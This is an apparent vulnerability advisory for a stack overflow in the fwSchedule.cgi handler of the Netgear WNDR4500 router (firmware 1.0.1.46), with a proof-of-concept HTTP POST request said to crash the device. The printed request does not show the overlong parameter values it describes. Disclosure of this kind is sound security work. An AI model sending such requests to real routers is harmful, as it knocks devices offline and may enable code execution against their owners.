# Netgear Vulnerability

Vendor:Netgear

Product:WNDR4500

Version:1.0.1.46

Type:Stack Overflow

Author:Jiaqian Peng

Institution:pengjiaqian@iie.ac.cn



## Vulnerability description

We found an stack overflow vulnerability in Netgear router with firmware which was released recently, allows remote attackers to crash the server. 

**Stack Overflow**

In `httpd` binary:

In the router's `fwSchedule.cgi` function, `starthour、startminute、endhour、endminute` is directly passed by the attacker, If this part of the data is too long, it will cause the stack overflow, so we can control the `starthour、startminute、endhour、endminute` to execute arbitrary code.

As you can see here, the input has not been checked. The parameter `starthour、startminute、endhour、endminute` is directly copy to a local variable placed on the stack, which overrides the return address of the function, causing buffer overflow.

<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>



## PoC

We set `endhour、endminute` as **aaaaa......** , and the router will crash, such as:

```http
POST /fwSchedule.cgi?id=4a62b07481c013b4c7d5b48c2e77e61c65e24a7c HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 4229
Origin: http://192.168.1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
Connection: close
Referer: http://192.168.1.1/FW_schedule.htm
Upgrade-Insecure-Requests: 1

action=Apply&checkboxNameAll=checkboxValue&checkboxNamehours=checkboxValue&time_zone=-8&schedule_day=255&schedule_alldayenable=0&starthour=0&startminute=0&&&schedule_daylightadjust=0&result=apply&enable_apmode=0
```



## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
